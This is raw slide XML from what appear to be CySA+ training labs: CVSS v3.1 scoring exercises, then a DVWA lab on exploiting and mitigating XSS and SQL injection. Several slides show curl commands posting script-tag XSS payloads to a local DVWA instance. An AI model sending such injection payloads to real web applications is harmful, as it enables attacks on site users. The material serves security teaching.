<file path=ppt/slides/slide6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16 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Open the CVSS v3.1 calculator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Browser: https://www.first.org/cvss/calculator/3.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Memorise the eight Base metrics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>These are CySA+ 2.3's bullet points: Attack vectors, Attack complexity, Privileges required, User interaction, Scope, Impact (C/I/A).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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608222"/>
            <a:ext cx="91440" cy="78455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05840" y="3771899"/>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05840" y="3771899"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Score Vuln #1 — Unauthenticated RCE on a public web server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Settings: AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Score Vuln #2 — Local privilege escalation on a workstation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Settings: AV:L / AC:L / PR:L / UI:N / S:U / C:H / I:H / A:H</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Score Vuln #3 — Reflected XSS that requires a click</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Settings: AV:N / AC:L / PR:N / UI:R / S:C / C:L / I:L / A:N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610</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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16 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Apply Environmental metrics (context awareness)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ 2.3 calls out internal / external / isolated and asset value.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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923794"/>
            <a:ext cx="91440" cy="101269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05840" y="3201543"/>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05840" y="3201543"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Build the prioritised list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Save as /tmp/prio.csv (open a shell on Killercoda or your laptop):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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64508"/>
            <a:ext cx="91440" cy="101269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05840" y="434225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05840" y="4342257"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Handle zero-days and exploitability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Zero-day = no patch exists yet.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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205222"/>
            <a:ext cx="91440" cy="101269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05840" y="5482971"/>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05840" y="5482971"/>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26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Validation (CySA+ 2.3 — true/false positive/negative)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A scanner finding may be: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611</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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16 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Score a Base CVSS vector for three realistic vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Apply environmental context to demote or promote a score.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cross-reference exploit databases for weaponisation status.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Produce a defensible, business-aware remediation priority list.</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612</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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17 — Exploiting and Mitigating XSS and SQL Injection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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will exploit a reflected XSS, a stored XSS, and a SQL injection on DVWA — then implement the standard mitigations (input validation, output encoding, parameterised queries, prepared statements). This maps to CySA+ 2.4 (Cross-site scripting, Injection flaws) and the Secure coding best practices sub-list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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613</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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17 — Reference Diagram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g_acb9c172ac.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2928881"/>
            <a:ext cx="5180076" cy="2143238"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_89d1b25ce1.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="2563097"/>
            <a:ext cx="5180076" cy="2874806"/>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614</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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17 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Start DVWA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Browse to http://127.0.0.1:8080, login admin / password, set DVWA Security = low, Setup → Create / Reset Database.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y docker.io sqlmap curl</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Reflected XSS (CySA+ "XSS — Reflected")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The DVWA endpoint vulnerabilities/xss_r/?name= echoes input straight into HTML.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ curl -s -b "$COOKIE" "http://127.0.0.1:8080/vulnerabilities/xss_r/?name=</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Stored XSS (CySA+ "XSS — Persistent")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>vulnerabilities/xss_s/ posts a guestbook message that is stored in MySQL and rendered to every visitor.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ curl -s -b "$COOKIE" -d "txtName=mal&amp;mtxMessage=&lt;script&gt;alert('stored')&lt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
